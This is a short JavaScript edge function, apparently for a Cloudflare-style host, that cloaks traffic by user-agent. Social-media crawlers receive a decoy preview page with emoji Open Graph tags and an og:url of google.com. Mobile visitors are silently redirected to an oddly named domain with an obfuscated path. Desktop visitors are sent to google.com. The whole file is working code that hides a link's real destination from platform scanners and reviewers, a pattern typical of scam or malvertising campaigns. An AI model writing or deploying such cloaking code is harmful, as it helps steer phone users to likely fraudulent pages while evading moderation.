export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="😍🎧🎬">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://s3.us-east-2.amazonaws.com/img-utils-conversions.pixelied.com/conversions/Thu-Sep-17-2026/b5c3ae05-d6ca-496d-b930-caf4e5308876/a66f4add-0833-4619-844e-2e15ccad7c20.tiff">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://racialburgerdiverse.com/cjD4yL/jK_lY4gZPV/1ce_ooD2zQ/i9vpv99cGvh92ha_/jSaZ7Hj5/2lCnc/5FKUC3fvAhwyQ/BQ2_7l5FWcJ5VF/1605Oo4lza8qDuDY/p635j4/Hjlck94lDVZFsPA6/tJabM/jw", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
